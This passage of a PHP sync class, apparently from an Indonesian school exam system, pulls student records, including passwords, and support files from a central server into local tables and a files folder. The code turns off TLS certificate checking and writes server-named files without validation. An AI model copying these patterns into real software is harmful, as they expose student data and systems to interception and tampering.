                  'status_sinkron' =>1,
                  'tanggal' =>$datetime 
                );
                $sinwhere = array(
                  'nama_data' =>$id
                );
                $sinexec =  $this->update('sinkron',$sindata,$sinwhere);
                $pesanAksi="Berhasil";
                  if($sinexec){
                    $dataTotal = $yes1.'/'.$yes3.'/'.$yes4.'/'.$yes5;
                    $senddata = array(
                      'status' =>200,
                      'pesan' =>$pesanAksi,
                      'jumlah' =>$dataTotal.' Data',
                    );
                    $this->KirimLogSinkron($id,$dataTotal);
                  }
                  else{
                    $senddata = array(
                      'status' =>203,
                      'pesan' =>'Gagal Simpan Data ke Tabel Sinkron',
                      'jumlah' =>$no1.'/'.$no3.'/'.$no4.'/'.$no5.' Data',
                    );
                  }

                  return $senddata;

          }
          else{
            $senddata = array(
                'status' =>203,
                'pesan' =>'Data Di Server Kosong',
                'jumlah' =>'',
              );
            return $senddata ; //data kosong
          }
        }
        else{
          $senddata = array(
            'status' =>203,
            'pesan' =>'Level Kelas Kosong',
            'jumlah' =>'',
          );
            return $senddata ; //Level Kelas Kosong
        }

      }//end 200
      else{
        $senddata = array(
          'status' =>203,
          'pesan' =>$getData->pesan,
          'jumlah' =>'',
        );
        return $senddata;
      }
    }
    //INSERT DATA SISWA
    elseif($id == 'SISWA'){
      $urlApi = $url.'/json/json_siswa.php?id='.$token;
      $tabel = 'siswa';
      $json = $this->CekServerCurlIn($urlApi);
      $getData = json_decode($json);
      if($getData->status == 200){
        if(!empty($getData->data)){
          $yes=0; $no=0;
          foreach ($getData->data as $val) {
            $data = array(
              "id_siswa"      => $val->id_siswa,
              "id_kelas"      => $val->id_kelas,
              "idpk"          => $val->idpk,
              "nis"           => $val->nis,
              "no_peserta"    => $val->no_peserta,
              "firt_nama"     => addslashes($val->firt_nama),
              "nama"          => addslashes($val->nama),
              "level"         => $val->level,
              "ruang"         => $val->ruang,
              "sesi"          => $val->sesi,
              "username"      => $val->username,
              "password"      => $val->password,
              "foto"          => $val->foto,
              "server"        => $val->server,
              "jenis_kelamin" => $val->jenis_kelamin,
              "agama"         => $val->agama,
              "status_siswa"  => $val->status_siswa,
              "soalPaket"     => $val->soalPaket,
            );
            $where = array(
              'username' =>$val->username,
            );
            $cekData = $this->fetch($tabel,$where);
            if(count($cekData) > 0) {
              $ex= $this->update($tabel,$data,$where);
              $pesanAksi="Berhasil Update";
            }
            else{
              $ex= $this->insert($tabel,$data);
              $pesanAksi="Berhasil Tambah";
            }
            if($ex){ $yes++; }else{ $no++; }
          }
          $sindata = array(
            'jumlah' => $yes,
            'jumlah_server' =>$getData->jumlah,
            'status_sinkron' =>1,
            'tanggal' =>$datetime 
          );
          $sinwhere = array(
            'nama_data' =>$id
          );
          $sinexec =  $this->update('sinkron',$sindata,$sinwhere);
          if($sinexec){
            $senddata = array(
              'status' =>200,
              'pesan' =>$pesanAksi,
              'jumlah' =>$yes.' Data Siswa',
            );
            //kirim aktivitas ke server ---------------------------------
            $this->KirimLogSinkron($id,$yes);
            //kirim aktivitas ke server ---------------------------------
          }
          else{
            $senddata = array(
              'status' =>203,
              'pesan' =>'Gagal Simpan Data ke Tabel Sinkron',
              'jumlah' =>$no.' Data Siswa',
            );
          }
         
           
          return $senddata;

        }else{
          $senddata = array(
              'status' =>203,
              'pesan' =>'Data Di Server Kosong',
              'jumlah' =>'',
            );
          return $senddata ; //data kosong
        }
      }//end 200
      else{
        $senddata = array(
          'status' =>203,
          'pesan' =>$getData->pesan,
          'jumlah' =>'',
        );
        return $senddata;
      }
    }
    //donwload file pendukung
    elseif($id == 'FILE_PENDUKUNG'){
      $urlApi = $url.'/json/json_file_pendukung.php?id='.$token;
      //$tabel = 'siswa';
      $json = $this->CekServerCurlIn($urlApi);
      $getData = json_decode($json);
      if($getData->status == 200){
        if(!empty($getData->data)){
          $yes=0; $no=0;
          //-------------------------------------------------
          function multiple_download2($urls, $save_path = '../files')
          {
            $multi_handle = curl_multi_init();
            $file_pointers = [];
            $curl_handles = [];
                    // Add curl multi handles, one per file we don't already have
            foreach ($urls as $key => $url) {
              $file = $save_path . '/' . basename($url);
              if (!is_file($file)) {
                $curl_handles[$key] = curl_init($url);
                $file_pointers[$key] = fopen($file, "w");
                curl_setopt($curl_handles[$key], CURLOPT_FILE, $file_pointers[$key]);
                curl_setopt($curl_handles[$key], CURLOPT_HEADER, 0);
                //curl_setopt($curl_handles[$key], CURLOPT_RETURNTRANSFER, 1);
                curl_setopt($curl_handles[$key], CURLOPT_CONNECTTIMEOUT, 60);
                curl_setopt($curl_handles[$key], CURLOPT_SSL_VERIFYPEER, false);
                curl_setopt($curl_handles[$key], CURLOPT_FOLLOWLOCATION, true);
                curl_multi_add_handle($multi_handle, $curl_handles[$key]);
              }
              else{
                unlink($file);
                $curl_handles[$key] = curl_init($url);
                $file_pointers[$key] = fopen($file, "w");
                curl_setopt($curl_handles[$key], CURLOPT_FILE, $file_pointers[$key]);
                curl_setopt($curl_handles[$key], CURLOPT_HEADER, 0);
                //curl_setopt($curl_handles[$key], CURLOPT_RETURNTRANSFER, 1);
                curl_setopt($curl_handles[$key], CURLOPT_CONNECTTIMEOUT, 60);
                curl_setopt($curl_handles[$key], CURLOPT_SSL_VERIFYPEER, false);
                curl_setopt($curl_handles[$key], CURLOPT_FOLLOWLOCATION, true);
                curl_multi_add_handle($multi_handle, $curl_handles[$key]);
              }
            }
            // Download the files
            do {
              curl_multi_exec($multi_handle, $running);
            } while ($running > 0);
                    // Free up objects
            foreach ($urls as $key => $url) {
              @curl_multi_remove_handle($multi_handle, $curl_handles[$key]);
              @curl_close($curl_handles[$key]);
              @fclose($file_pointers[$key]);
            }
            curl_multi_close($multi_handle);
          }
          $urls = [];
          $yes=0;
          foreach ($getData->data as $value) {
            //var_dump($value);
            $urls[] = $url."files/".$value;
            $yes++;
          }
          $pesanAksi="Berhasil Download File Pendukung";
          multiple_download2($urls);

          //-------------------------------------------------
          $sindata = array(
            'jumlah' => $yes,
            'jumlah_server' =>$getData->jumlah,
            'status_sinkron' =>1,
            'tanggal' =>$datetime 
          );
          $sinwhere = array(
            'nama_data' =>$id
          );
          $sinexec =  $this->update('sinkron',$sindata,$sinwhere);
          if($sinexec){
            $senddata = array(
              'status' =>200,
              'pesan' =>$pesanAksi,
              'jumlah' =>$yes.' File Pendukung',
            );
            //kirim aktivitas ke server ---------------------------------
            $this->KirimLogSinkron($id,$yes);
            //kirim aktivitas ke server ---------------------------------
          }
          else{
            $senddata = array(
              'status' =>203,
              'pesan' =>'Gagal Simpan Data ke Tabel Sinkron',
              'jumlah' =>$no.' Data Siswa',
            );
          }
         
           
          return $senddata;

        }else{
          $senddata = array(
              'status' =>203,
              'pesan' =>'Data Di Server Kosong',
              'jumlah' =>'',
            );
          return $senddata ; //data kosong
        }
      }//end 200
      else{
        $senddata = array(
          'status' =>203,
          'pesan' =>$getData->pesan,
          'jumlah' =>'',
        );
        return $senddata;
      }
    }
    else{
      $urlApi = [];
    }
   

  }



}//end cla
?>